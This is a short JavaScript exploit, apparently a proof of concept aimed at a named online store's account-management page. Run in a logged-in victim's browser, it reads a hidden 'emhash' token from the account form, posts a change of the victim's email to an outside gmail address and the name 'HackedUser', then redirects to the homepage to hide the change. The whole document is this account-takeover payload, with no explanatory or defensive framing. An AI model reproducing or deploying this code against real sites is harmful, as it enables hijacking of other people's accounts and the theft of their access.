fetch("https://store.dish.com/clientlogin.asp", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "posted=1&action=editaccount&theid="
})
.then(response => response.text())
.then(text => {
    // Extract the emhash value
    let emhash = text.match(/name="emhash" value="([a-f0-9]{64})"/)[1];

    // Now update the user's email to our controlled email
    return fetch("https://store.dish.com/clientlogin.asp", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `action=doeditaccount&emhash=${emhash}&name=HackedUser&allowemail=ON&email=68abdelrahmanmohamed2%40gmail.com&oldpw=&newpw=&newpw2=`
    });
})
.then(() => {
    // Redirect victim to homepage (or show a fake success message)
    window.location.href = "https://store.dish.com/home";
})
.catch(error => console.log("Exploit failed:", error));
